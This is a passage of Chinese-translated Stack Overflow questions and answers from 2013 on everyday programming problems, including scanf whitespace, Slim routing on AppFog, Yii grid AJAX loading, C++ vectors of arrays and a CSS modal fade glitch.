3)  Click Instruments Record button to stop the running of the app
4)  Click Scripts -> Add -> Create
5)  Click Record button at bottom of Instruments (which is for recording the script)
6)  Click Record button at top of Instruments (which is for running the app)
7)  Click on Trace Log -> Script to view the script you are creating. 
```

哇！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-06T21:45:55.640

检查您是否在配置文件方案中选择了调试模式，并且您是否拥有正确的签名身份和配置文件。

# c - 在 C 中的 scanf() 中使用“\n”

> ID：15443483
> 
> 赞同：22
> 
> 时间：2013-03-15T23:06:33.260
> 
> 标签：c, scanf

我错误地`scanf("%d\n",&val);`在我的一个程序中使用，我无法理解行为，功能显示。

```
int main(){
    int val;
    scanf("%d\n", &val);
    printf("%d\n", val);
    return 0;
} 
```

现在程序需要 2 个整数输入，并打印输入的第一个输入。那额外的东西应该`\n`带来什么不同？

我试图搜索但找不到答案，即使通过`scanf`.

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-15T23:10:00.743

格式字符串中的`'\n'`- 或任何空白字符 - 会消耗输入中的整个（可能为空的）空白字符序列。因此，`scanf`当它遇到下一个非空白字符或输入流的结尾时（例如，当输入从文件重定向并到达其结尾时，或者在您使用 Ctrl-D 关闭标准输入之后）时，唯一的返回。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-03-15T23:12:11.613

在`man scanf`我的 Linux 机器中：

> 指令是以下之一：
> 
> 一系列空白字符（空格、制表符、换行符等；参见 isspace(3)）。该指令匹配输入中任意数量的空白，包括无空白。

顺便说一句，`%d`也是一个*指令*。

所以你`"%d\n"`有两个指令，第一个读取数字，第二个......很好地读取任何数量的空白，包括你的行尾。您必须键入任何非空白字符才能使其停止。

# ruby-on-rails - 如果我的项目变化很快，我应该使用 TDD 和 BDD 吗？

> ID：15443491
> 
> 赞同：0
> 
> 时间：2013-03-15T23:07:15.940
> 
> 标签：ruby-on-rails, unit-testing, tdd, integration-testing, bdd

我有自己的小项目，我正在使用 RoR 创建，我计划它具有中小型负载。
毫无疑问，我从 BDD 和 TDD（确切地说是 Cucumber 和 RSpec，但我对 TestUnit 也有经验）开始，我喜欢它，但因为它是我自己的项目，而且它有点初创 - 我正在改变其中的很多东西，很多要求，许多想法应该如何工作和看起来。因此，总是使用 BDD 和 TDD 对其进行编码变得非常耗时，即使我只介绍了常见情况。
我应该怎么办？我是否应该牺牲 BDD 和 TDD 来提高生产力，直到我有一个坚实的基础并且是时候进行生产了，然后我才编写测试？
我应该现在就写它们，但尽可能少吗？我现在应该只写 RSpec 而忘记 Cucumber 吗？或者也许只是 TestUnit 来测试模型，因为它是最重要的，其他一切都可以改变？
提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T00:07:10.343

这不是一个政治正确的答案，我相信这会让纯粹主义者感到不安。这里是这样的：对于一个小型、快速变化的项目，最好只编写代码并跳过 TDD 和 BDD 步骤。否则，您将大大延迟完成。这不是应该始终遵循的规则，但如果您认为您了解项目的要求，那么不要对编写代码感到内疚。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-15T23:56:33.820

使用 BDD/TDD 可能会提高您的工作效率。您说您的需求经常变化，也许改变/编写测试用例等比编写实际代码然后销毁它并在每次需求变化时编写新代码更灵活/快速。也许这样做可以作为一种过滤器/层，通过它来审查您想要创建的更改。在您花时间实施之前，它可能会帮助您了解事情是否会奏效。当您确实实施它时，您当然拥有 TDD 的好处，您已经拥有测试套件来确保正确性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-16T00:12:35.037

就个人而言，如果我*只是*为了定义功能、设计、实现等而进行迭代。我倾向于轻视测试。

也就是说，一旦我*完成*了那部分，我通常会抛弃那些开发高峰，并使用 T/BDD 推进可交付成果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-16T01:45:56.017

在我看来，既然这是你的项目，你就真的坐在驾驶座上。如果您觉得 TDD/BDD 的优势比更多实验/更快上市时间的优势强，那么我会说坚持下去。另一方面，如果您真的要确定该项目是否有腿，并且最终可能会被废弃，那么在短期内专注于更快的学习可能是一个更好的选择。我想这就是我建议您确定项目当前目标并将您的实践与它们保持一致的方式。

虽然这并没有给出一个非常具体的答案，但我认为它有点，但您可以进行一些更高级别的场景测试，以确保您不会在您的快速功能更改中破坏任何主要内容，但是完全放弃 TDD/BDD。我个人的经验是，在练习 TDD 时我感觉更有效率，因为它帮助我一次专注于解决一个问题，并且我发现自己进入了一个更好的节奏。

希望有帮助！

布兰登

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-16T09:51:49.930

我认为您想使用 TDD（也许不是 BDD）正是*因为*需求变化如此之大。TDD 支持可重构的设计 + 代码库，因此易于更改。在一个项目的过程中（即使是小到一两周），使用 TDD + 重构实际上会比不使用它时更快。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-16T08:08:05.500

> > 因此，总是使用 BDD 和 TDD 对其进行编码变得非常耗时，即使我只介绍了常见情况。

我似乎总是使用 TDD 来提高编码速度。在执行测试时找到“愚蠢的编码错误”，并比没有单元测试的情况下更快地找到根本原因。

对于 BDD，如果您的需求倾向于大修，我可以想象您会推迟对需求的测试，直到船舶朝着更统一的方向启航。

# wordpress - WordPress 自定义帖子模板不会加载

> ID：15443495
> 
> 赞同：4
> 
> 时间：2013-03-15T23:07:46.243
> 
> 标签：wordpress, templates, custom-post-type

我创建了一个自定义帖子，并制作了一个名为 single-postname.php 的模板文件

在我被重定向回主页之前，我无法加载模板文件，但在刷新 .htaccess 文件后，我只是得到一个空白页。

我尝试再次删除和添加帖子，更改了几次永久链接，并更改了主题，似乎没有任何效果。我还能做些什么来尝试强制 WordPress 再次查找文件？

register_post_type

```
$labels = array( 
    'name' => _x( 'Conversations', 'conversation' ),
    'singular_name' => _x( 'Conversation', 'conversation' ),
    'add_new' => _x( 'Add New', 'conversation' ),
    'add_new_item' => _x( 'Add New Conversation', 'conversation' ),
    'edit_item' => _x( 'Edit Conversation', 'conversation' ),
    'new_item' => _x( 'New Conversation', 'conversation' ),
    'view_item' => _x( 'View Conversation', 'conversation' ),
    'search_items' => _x( 'Search Conversations', 'conversation' ),
    'not_found' => _x( 'No conversations found', 'conversation' ),
    'not_found_in_trash' => _x( 'No conversations found in Trash', 'conversation' ),
    'parent_item_colon' => _x( 'Parent Conversation:', 'conversation' ),
    'menu_name' => _x( 'Conversations', 'conversation' ),
);

$args = array( 
    'labels' => $labels,
    'hierarchical' => false,
    'description' => 'conversation between users on the site',
    'supports' => array( 'title', 'excerpt', 'author', 'comments', 'custom-fields' ),

    'public' => true,
    'show_ui' => true,
    'show_in_menu' => true,
    'menu_position' => 20,
    //'menu_icon' => 'http://findicons.com/files/icons/2229/social_media_mini/24/google_talk.png',
    'show_in_nav_menus' => true,
    'publicly_queryable' => true,
    'exclude_from_search' => false,
    'has_archive' => true,
    'query_var' => true,
    'can_export' => true,
    'rewrite' => true,
    'capability_type' => 'post'
);

register_post_type( 'conversation', $args ); 
```

文件名=single-conversation.php

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T06:00:34.410

根据模板层次结构，如果您希望在自定义帖子类型“xyz”下输出所有帖子的存档，那么您将创建一个名为“archive-xyz.php”的文件并将其放在您的页面模板目录中。如果您希望在自定义帖子类型“xyz”下输出单个帖子，那么 WordPress 将查找名为“single-xyz.php”的文件。

[http://codex.wordpress.org/Template_Hierarchy](http://codex.wordpress.org/Template_Hierarchy)

这是我试图阐明的:)

# eclipse - Eclipse Photran 不编译带有大写字母扩展名的源代码

> ID：15443496
> 
> 赞同：2
> 
> 时间：2013-03-15T23:07:51.240
> 
> 标签：eclipse, preprocessor, photran

根据 Photran 文档的理解，如果 Fortran 源代码的扩展名带有大写字母，例如 F90 或 F95，则在构建时会自动预处理此文件。但这对我不起作用...如果我尝试构建一个只有一个文件 main.F90 的项目：

```
program main
#ifdef __linux__
    print *,"Hello, world!"
#endif
end program 
```

然后 Photran 会说“Nothing to build for project xxx”。我在 Windows 和 Linux 上都尝试过 Photran 8 (Eclipse Juno) 和 GNU 编译器，我也在 Linux 上尝试过 Intel Fortran 编译器，所以它们都失败了。所以我猜这与Eclipse有关。我还可以确认“源表单”设置正确，即 *.F90 设置为“自由格式 - C 预处理”。任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-27T15:15:28.927

对我来说，Photran 似乎不明白 f90 和 F90 之间的区别。如果没有 Photran 抱怨 main.F90 已经存在，您甚至不能将 main.f90 重命名为 main.F90。

如果您现在查看*General -> Content Types |*
下的 Workspace Preferences *Text -> Fortran Source File*
你可以看到只列出了小写的文件扩展名，如果小写对应的文件已经存在，你甚至不能添加一个大写的扩展名。然而，毕竟在构建方面，Photran 区分小写和大写，因此忽略了 F90 文件。

*我的第一个猜测是在Fortran General -> Source Files*
下的 Project settings 中将 f90-Files 配置为“Free Form - C Preprocessed” ， 但这似乎没有效果。

 **最后，我在Fortran Build -> Settings |*
下 的 Project Settings 中的 gfortran 命令中添加了 -cpp 选项。*GNU Fortran 编译器 -> 杂项*。
这告诉 gfortran 每次都运行预处理器。现在你的例子就像一个魅力 - 就像 main.f90。

它似乎是几个错误的组合。

PS：我正在为并行应用程序开发人员运行 Eclipse，Juno Service Release 2 @ Ubuntu 12.04 LTS 和 GNU Fortran Compiler 4.6.3*

# php - 在 AppFog 上运行的 Slim 框架的路由问题

> ID：15443504
> 
> 赞同：1
> 
> 时间：2013-03-15T23:08:23.837
> 
> 标签：php, .htaccess, slim, appfog

我已经在几个不同的服务器上成功地运行了 Slim 应用程序，并且今天尝试使用相同的结构在 AppFog 上设置一个，但它运行不正常。

我将从我的目录结构开始：

```
.htaccess
/public
    .htaccess
    index.php
    /routes
/Slim 
```

根**.htaccess**文件包含来自 AppFog 文档的 DocumentRoot 代码。

```
RewriteEngine on
RewriteCond %{HTTP_HOST} ^brs.aws.af.cm$ [NC,OR]
RewriteCond %{HTTP_HOST} ^www.brs.aws.af.cm$
RewriteCond %{REQUEST_URI} !public/
RewriteRule (.*) /public/$1 [L] 
```

**/public**目录是我的 api 代码所在的位置，目前是 Slim index.php**和**.htaccess**文件**。**index.php**文件包含两个简单的路由：

```
require '../Slim/Slim.php';

\Slim\Slim::registerAutoloader();

$app = new \Slim\Slim();

// Default GET route
$app->get('/', function () {
    echo "Default GET route";
});

// Hello World route
$app->get('/hello/:name', function ($name) {
    echo "Hello, $name";
});

$app->run(); 
```

服务器设置在[http://brs.aws.af.cm/](http://brs.aws.af.cm/)并且我在下面列出了主要路线：

1.  / => 使用默认的 GET 路由
2.  /hello/john => 404 错误
3.  /public/hello/john => 有效，但在 url 中需要“/public”

这里有一些额外的奇怪之处。七个字符的路由导致 404 错误，六个或更少最终使用默认的 GET 路由。

1.  /123456 => 不应该工作，但使用默认的 GET 路由
2.  /1234567 => 404 错误

我完全被难住了。我认为它与 DocumentRoot 代码有关，但我不确定到底是什么。我也试过设置

```
RewriteBase /public/ 
```

在**/public/.htaccess**中，但它似乎没有任何影响。

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-12T21:13:34.847

在 Environment.php 第 143 行的 Slim PHP 框架中有一个错误。特别是，它假设`$_SERVER['SCRIPT_NAME']`路径与`$_SERVER['REQUEST_URI']`变量兼容。在大多数情况下，这可能是正确的，但在使用 MOD_REWRITE 隐藏中间目录时（如您引用的 .htaccess 中发生的情况）则不然。

正在发生的事情`$_SERVER['SCRIPT_NAME']`看起来像“/public/something...”，但是（因为它是隐藏的）`$_SERVER['REQUEST_URI']`看起来像“/something...”。

Slim 假设请求 URI 是基于脚本名称的，这里不是这种情况。我计划通知 Slim 作者该错误，但也想在此处记下它。

您可以通过将 Slim/Environment.php 第 143 行修改为以下内容来修复/解决此问题：

```
if (strpos($_SERVER['REQUEST_URI'], $_SERVER['SCRIPT_NAME']) === 0) {
    $env['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME']; //Without URL rewrite
    $env['PATH_INFO'] = substr_replace($_SERVER['REQUEST_URI'], '', 0, strlen($env['SCRIPT_NAME']));
} else {
    $env['SCRIPT_NAME'] = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'])); //With URL rewrite
    $env['PATH_INFO'] = $_SERVER['REQUEST_URI'];
}
// $env['PATH_INFO'] = substr_replace($_SERVER['REQUEST_URI'], '', 0, strlen($env['SCRIPT_NAME'])); 
```

至少在我的情况下这似乎工作正常。我相信这样做的目的是从请求 uri 中删除路径，但这似乎是一种非常可怕的方式。如果您需要子目录来继续工作，您可能需要做更多的思考。:)

# macos - 如何在 OSX 上使用 Automator 创建带有文件名的 txt 并将其保存到同一文件夹中？

> ID：15443506
> 
> 赞同：0
> 
> 时间：2013-03-15T23:08:25.833
> 
> 标签：macos, osx-lion, automator

我想在包含所述文件夹的所有文件名的同一文件夹中创建一个 .txt 文件。

我怎样才能做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:13:48.510

您可以在终端中使用

```
ls {DIR} >> {FILE} 
```

例如，如果我想为桌面上的所有文件编写一个名为“ls.txt”的文件，我可以使用

```
ls /Users/corvinmcpherson/Desktop/ >> /Users/corvinmcpherson/Desktop/ls.txt 
```

你也可以像这样使用自动机创建一个： ![在此处输入图像描述](../Images/4e7117abc21568bf9e5d5a8519b61502.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-17T00:23:56.033

或者您可以创建一个像这样的 Automator Workflow 作为服务，这样您所要做的就是右键单击文件夹，单击服务，此文本文件将出现在文件夹中，并带有文件夹的名称。

![获取文件夹的内容作为文本服务工作流](../Images/9780887a63615361e1f9f8347a51f19a.png)

# apache2 - Trac 在 Apache2 Web 服务器上的子定位

> ID：15443507
> 
> 赞同：0
> 
> 时间：2013-03-15T23:08:28.163
> 
> 标签：apache2, trac

我需要将 Trac 放在 / 以外的 URL 路径上。如果我从[http://trac.edgewall.org/wiki/TracOnUbuntu](http://trac.edgewall.org/wiki/TracOnUbuntu)获取配置并修改位置块，我会收到错误消息“没有处理程序匹配到 /trac 的请求”。我怎样才能避免这种情况？

```
<VirtualHost *:80>
    ServerName trac.local
    <Location /trac> # instead of Location /
       SetHandler mod_python
       PythonInterpreter main_interpreter
       PythonHandler trac.web.modpython_frontend
       PythonOption TracEnv /var/local/trac
       PythonOption TracEnvParentDir /var/local/trac
       PythonOption TracUriRoot /
       PythonOption TracEnv /var/local/trac
        # PythonOption TracEnvIndexTemplate /var/local/trac/templates/index-template.html
       PythonOption TracLocale en_US.UTF8
       PythonOption PYTHON_EGG_CACHE /tmp
       Order allow,deny
       Allow from all
    </Location>
    <Location /trac/login> # instead of /login
      AuthType Basic
      AuthName "myproject"
      AuthUserFile /var/local/trac/.htpasswd
      Require valid-user
    </Location>
</VirtualHost> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T13:13:42.263

调整'PythonOption TracUriRoot /'怎么样？

此外请承认，mod_python 已被贬值（生命周期结束），您应该[选择 WSGI](http://trac.edgewall.org/wiki/TracModWSGI)来代替新安装。

# php - 将带有撇号的格式化文本从 javascript 传递到带有 innerHTML 的 html 元素

> ID：15443509
> 
> 赞同：0
> 
> 时间：2013-03-15T23:08:39.503
> 
> 标签：php, javascript, html

我有 3 个页面加载相同的幻灯片。我试图通过将变量中的新内容从 javascript 传递到 html 元素来合并到一个页面。效果应该类似于ajax。传递的内容包括 html 标记。一切正常，但如果我在文本中包含撇号，它会失败。我可以通过使用锐角符号来解决；但想用撇号。这是标记和脚本的示例。Firefox、chrome 和 ie9 的结果相同。没什么大不了的，但我想了解它为什么会失败。有任何想法吗？

```
<?php
// Test of script passing content to <p> element
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en'>
    <head>
<script type="text/javascript">
function testSwap(text) {
    var text1=text;
    document.getElementById('test').innerHTML = text1;
}
</script>
</head><body>
<?php
$testtext="&lt;img style= &quot; float:left;margin:10px &quot; src= &quot;          http://www.w3schools.com/images/pulpit.jpg &quot; alt=&quot; Pulpit rock &quot; width=&quot;50&quot; height=&quot;60&quot; /&gt; &lt;span style=&quot;font-weight:bold;font-size:16px;text-decoration:underline&quot; &gt; Second Page Title &lt;/span&gt; : This page tells how we found our family&#180;s origins. This sample includes an image, a span element with styling, and a double line break. &lt;br /&gt;&lt;br /&gt; They all work. Unfortunately, the script fails if I include an apostrophe in this text so I use &#180; instead.&lt;br /&gt;&lt;br /&gt;Same result in firefox, chrome and ie9\. Not a big deal, but I&#180;d like to understand why it fails. Any ideas?";

?>
<div><button type="button" onclick="testSwap('<?php echo $testtext; ?>')">Click Me!</button></div>

<p id='test'><span style='font-weight:bold;font-size:16px;text-decoration:underline'>My Main Page Title:</span>
The pages are in a genealogy site with our family&#39;s history. Main page introduces site and describes content<br /><br />Other two pages use same slide show of family pictures, but have more detailed info.<br /><br />Menu currently directs to a new page and reloads the slideshow. I plan to use javascript to avoid the reload if user has it enabled.<br /><br />This sample demonstrates the idea. Click on the button for second page.
</p>

</body></html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:12:40.477

使用`htmlentities`： http: [//php.net/manual/en/function.htmlentities.php](http://php.net/manual/en/function.htmlentities.php)

```
onclick="testSwap('<?php echo htmlentities($testtext); ?>')" 
```

你`$testtext`的是什么，里面有引号，对吗？如果是这样，`htmlentities`将把引号变成一个`&#039;`（或者`&#34;`如果它是一个双引号），它不会破坏`testSwap`onclick。

编辑：对不起，我完全改变了我的答案。改为使用`htmlentities`（之前是 urlencode）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:13:43.047

在页面呈现为 HTML 之前，PHP 标记会被标记内的表达式结果替换。因此，由于您`<?php echo $testtext; ?>`在单引号内，因此渲染后这些引号会出现问题。

您可以在字符串中使用反斜杠转义引号，这样当它以 HTML 呈现时，它会正确显示。

# yii - Yii：如何强制 CGridview 仅通过 AJAX 加载数据？

> ID：15443513
> 
> 赞同：4
> 
> 时间：2013-03-15T23:08:53.133
> 
> 标签：yii

有没有办法让 CGridView在它所在的视图的初始渲染中*不*加载数据，而是让它在初始页面加载后加载带有后续 AJAX 请求的第一页？

这主要是为了性能优化。在 CGridView 后面有一个相当慢的数据模型，我希望能够以一种快速的方式加载页面，然后在几秒钟后通过 AJAX 请求加载数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-16T04:51:22.860

您可以按如下方式修改操作：

```
public function actionIndex() {
  $dataProvider = new CActiveDataProvider('User'); // The dataprovider your grid uses
  if (!$this->isAjaxRequest()) {
    $dataProvider->criteria->addCondition('1 = 0'); // You could also use 0, but I think this is more clear
  }

  [...]
} 
```

然后在 javascript 部分的视图中：

```
$(function() { // If you are using jQuery this is executed when the page is loaded
  $.fn.yiiGridView.update("{id-of-your-grid-view}");
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-07T18:07:22.817

Brewer Gorge 非常接近，多亏了他建议的答案，这让我走上了正轨。这有效：

```
// Controller, after creating $dataProvider, before calling $this->render...
if (!Yii::app()->request->isAjaxRequest) {
    $dataProvider->criteria->addCondition('1 = 0');
}

// View
<script type="text/javascript">
$(window).load(function() {
    $('#id-of-grid').yiiGridView('update');
});
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-09T01:42:34.437

只需像这样在控制器中编写代码：

```
$model= new Data('search');
$model->unsetAttributes();

if(isset($_GET['Data']))
   $model->attributes = $_GET['Data'];

if (!Yii::app()->request->isAjaxRequest)
   $data->id=0; //or something that sure model return empty 
```

# c++ - 如何在 C++ 中声明 wchar_t[] 的向量？

> ID：15443516
> 
> 赞同：3
> 
> 时间：2013-03-15T23:09:04.970
> 
> 标签：c++, vector, wchar-t

我需要在包含 wchar_t 的 c 字符串的 C++ 程序向量中使用。我试图做到这一点：

```
using std::vector;

vector<wchar_t[SIZE]> string_list(100); 
```

但我得到包含以下单词的大错误输出：

```
error: functional cast to array type «std::vector<wchar_t [512]>::value_type {aka wchar_t [512]}» 
```

我做错了什么？为什么我会收到这样的错误？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T23:18:53.207

不幸的是，由于数组类型的许多奇怪之处，原始数组不符合*`std::vector`对元素类型的要求。

如果你真的想要固定大小的数组，你应该使用`std::array<wchar_t,SIZE>`，因为`std::array`模板修复了原始数组的问题，而是生成像正确值一样的对象（例如，a`std::array<wchar_t,SIZE>`是可分配的，而原始数组不是）。

但是，如果您想要字符串数据并且字符串并非都是相同的固定大小，那么您根本不应该使用数组。您最有可能使用`std::wstring`：

```
std::vector<std::wstring> string_list; 
```

^(* 除非我弄错了，否则根据 C++11 规范实际上是合法的，`std::vector<wchar_t[100]> v(100);`因为单独执行此操作不会对元素类型提出任何要求，除非它是默认可构造的，即数组是。然而，做任何有用的事情`v`确实需要比数组提供更多的元素类型。)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-15T23:10:31.160

您不能在 C++ 中声明数组向量。一种方法是将数组放入结构中，然后在向量中使用该结构。

```
struct WCharArray
{
  wchar_t a[SIZE];
};

vector<WCharArray> string_list(100); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-15T23:16:19.010

你不能创建一个`vector`数组，因为数组很奇怪。

你有几个选择：

1.  如果您的字符串是静态的，您可以使用指针向量`vector<wchar_t*>`。
2.  如果您确实需要数组向量，请将数组包装到结构中：
3.  如果可用，您可以使用`array`模板：`vector< array<wchar_t, SIZE> >`.

选项 2 将如下所示：

```
struct WArray
{
    wchar_t s[SIZE];
};
vector<WArray> string_list; 
```

# google-chrome - 在 Google Chrome 中，我的模态窗口的边框在转换时出现故障

> ID：15443524
> 
> 赞同：1
> 
> 时间：2013-03-15T23:10:03.920
> 
> 标签：google-chrome, css, modal-dialog, css-transitions

我有一个测试页面，我在其中创建了一个用于登录用户的模式对话框。我想使用 CSS3 转换使对话框淡入，我已经成功地做到了，但是 div 的边框在转换它的不透明度和一些内部段落似乎移动了 1px。我无法在 jsFiddle 上重新创建问题，所以这是我的源代码：

```
<!DOCTYPE html>
<html>
<head>
<title>Modal Testing</title>
<style type="text/css">
.popup {
    margin:auto;
    margin-left:-100px;
    left: 50%;
    top: 40%;
    z-index: -1;
    position:fixed;
    background: white;
    height:150px;
    width:200px;
    border: 2px solid grey;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    padding: 10px;
    font-family:Arial, Helvetica,sans-serif;
    font-size:11pt;
    clear: both;
    opacity:0;
    -webkit-transition: opacity 0.5s ease;
    -moz-transition: opacity 0.5s ease;
    -o-transition: opacity 0.5s ease;
    transition: opacity 0.5s ease;
}

.popup a, .signup a {
    font-size:8pt;
}

.info {
    text-align: center;
}

.signup {
    margin:auto;
    margin-left:-100px;
    left: 50%;
    top: 40%;
    position:fixed;
    z-index: 10;
    background: white;
    width: 0px;
    height: 0px;
    font-family:Arial, Helvetica,sans-serif;
    font-size:11pt;
    opacity:0;
    -webkit-transition: opacity 0.5s ease;
    -moz-transition: opacity 0.5s ease;
    -o-transition: opacity 0.5s ease;
    transition: opacity 0.5s ease;
}

.alignright {
    float: right;
    text-align: right;
}

.field {
    width: 80%;
}
</style>
<script>

function displayLogin() {
    closeSignup();
    openStyle("popup", "150px");
    document.getElementById("username").tabIndex = "1";
    document.getElementById("password").tabIndex = "2";
    document.getElementById("loginsubmitbutton").tabIndex = "3";
    document.getElementById("loginclose").tabIndex = "4";
    document.getElementById("signuplink").tabIndex = "5";
    document.getElementById("forgottenlink").tabIndex = "6";
}
function displaySignup() {
    closeLogin();
    openStyle("signup", "200px");
    document.getElementById("signup_username").tabIndex = "1";
    document.getElementById("signup_password").tabIndex = "2";
    document.getElementById("signup_reenter").tabIndex = "3";
    document.getElementById("signup_email").tabIndex = "4";
    document.getElementById("signupsubmitbutton").tabIndex = "5";
    document.getElementById("signupclose").tabIndex = "6";
}
function openStyle(classname, height) {
    document.getElementsByClassName(classname)[0].style.opacity = "1";
    document.getElementsByClassName(classname)[0].style.zIndex = "10";
}
function closeLogin() {
    document.getElementsByClassName("popup")[0].style.opacity = "0";
    setTimeout(function() {closeStyle("popup");
    document.getElementById("username").tabIndex = "-1";
    document.getElementById("password").tabIndex = "-1";
    document.getElementById("loginsubmitbutton").tabIndex = "-1";
    document.getElementById("loginclose").tabIndex = "-1";
    document.getElementById("signuplink").tabIndex = "-1";
    document.getElementById("forgottenlink").tabIndex = "-1";}, 500);
}
function closeSignup() {
    document.getElementsByClassName("signup")[0].style.opacity = "0";
    setTimeout(function() {closeStyle("signup");
    document.getElementById("signup_username").tabIndex = "-1";
    document.getElementById("signup_password").tabIndex = "-1";
    document.getElementById("signup_reenter").tabIndex = "-1";
    document.getElementById("signup_email").tabIndex = "-1";
    document.getElementById("signupsubmitbutton").tabIndex = "-1";
    document.getElementById("signupclose").tabIndex = "-1";}, 500);
}
function closeStyle(classname) {
    document.getElementsByClassName(classname)[0].style.zIndex = "-1";
}
function submitLogin() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    //submit login as POST request from XMLHTTPrequest
}
function submitSignup() {
    var username = document.getElementById("signup_username").value;
    var password = document.getElementById("signup_password").value;
    var reenter = document.getElementById("signup_reenter").value;
    var email = document.getElementById("signup_email").value;
    if (password !== reenter) {
        alert("The passwords do not match.");
        return;
    }
    //submit signup as POST request from XMLHTTPrequest
    console.log({user:username, pass:password, email:email});
}
</script>
</head>
<body>
<button onclick="displayLogin();">Show Login Screen</button><br>
<div class="popup">
    Username:<a class="alignright" href="javascript:closeLogin();" id="loginclose" tabIndex="-1">close</a><br>
    <input type="text" id="username" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('loginsubmitbutton').click()"><br>
    Password:<br>
    <input type="password" id="password" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('loginsubmitbutton').click()"><br>
    <button onclick="submitLogin();" id="loginsubmitbutton" tabIndex="-1">Login</button><br>
    <p class="info"><a href="javascript:displaySignup();" id="signuplink" tabIndex="-1" >Sign up!</a> - <a href="javascript:displayForgotten();" id="forgottenlink" tabIndex="-1">Forgot Password?</a></p>
</div>
<div class="signup">
    Username:<a class="alignright" href="javascript:closeSignup();" id="signupclose" tabIndex="-1">close</a><br>
    <input type="text" id="signup_username" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('signupsubmitbutton').click()"><br>
    Password:<br>
    <input type="password" id="signup_password" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('signupsubmitbutton').click()"><br>
    Re-enter Password:<br>
    <input type="password" id="signup_reenter" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('signupsubmitbutton').click()"><br>
    Email:<br>
    <input type="text" id="signup_email" class="field" tabIndex="-1" onkeydown="if (event.keyCode == 13) document.getElementById('signupsubmitbutton').click()"><br>
    <button onclick="submitSignup();" id="signupsubmitbutton" tabIndex="-1">Signup</button><br><br>
</div>
</body>
</html> 
```

请原谅我的坏习惯。

# php - 为检查的每个元素执行函数

> ID：15443525
> 
> 赞同：0
> 
> 时间：2013-03-15T23:10:05.913
> 
> 标签：php, javascript, html, function, checkbox

我有几个复选框，我想为每个标记为选中的元素执行一个函数。我怎样才能做到这一点？

在我的特殊情况下，我认为这可能会更容易一些，因为复选框的构造如下：

```
 $get_json_values=json_decode($json_string,true);
        foreach ($get_json_values as $key=>$getlikes) {  
          if($getlikes['type']=='like') {
          ?>
            <div>
              <input type="checkbox" name="<?php echo $getlikes['name'] ?>" value="<?php echo $getlikes['id'] ?>" checked> 
            <a href="https://www.facebook.com/<?php echo $getlikes['id']; ?>" target="_top">
              <?php echo $getlikes['name'] ?> </a>
            </div>
        <?php
      }}
       ?> 
```

所以我认为它应该是这样的：

```
function doIfChecked()
{
  foreach ($get_json_values as $key=>$getlikes) {
       if($getlikes['type']=='like'&&<sequence that checks if checkbox is checked>)
           {//do stuff}
          }
} 
```

有人可以帮忙吗？

* * *

感谢 Julian H. Lam，我找到了一个很好的答案，**但**我的问题是，对于每个元素，我需要向服务器发出请求（如 facebook 上的页面），但我不能在里面放任何 php javascript。

那么，既然 js 中不允许使用 php，我该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:14:20.363

使用 javascript：

```
var checkboxes = document.querySelectorAll('input[type="checkbox"]'),
    numCheckboxes = checkboxes.length,
    x;

for(x=0;x<numCheckboxes;x++) {
    if (checkboxes[x].checked === true) {
        // add code here to be done for each checked element
        // you can refer to the checked element by calling "checkboxes[x]"
    }
} 
```

# django - PyCharm Django 控制台适合执行 manage.py 任务吗？

> ID：15443526
> 
> 赞同：0
> 
> 时间：2013-03-15T23:10:09.997
> 
> 标签：django, pycharm

有一个 PyCharm Django 控制台。我也可以在该控制台中运行 manage.py 吗？我输入什么语法来执行

```
python manage.py syncdb 
```

在 Django 控制台中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:17:58.220

你实际上并没有按照你的想法运行它。要`manage.py`在 PyCharm 中运行任务，请执行以下操作：

1.  在主菜单上，选择工具 | 运行 manage.py 任务，或按 Alt R。
2.  在 Enter manage.py 任务名称对话框中，开始输入所需的任务名称。在您键入时，建议列表会缩小以仅显示匹配的任务。

    > 请注意，在键入星号时，PyCharm 会显示可用任务的完整列表。

3.  选择所需的任务。
4.  按`Enter`开始任务。

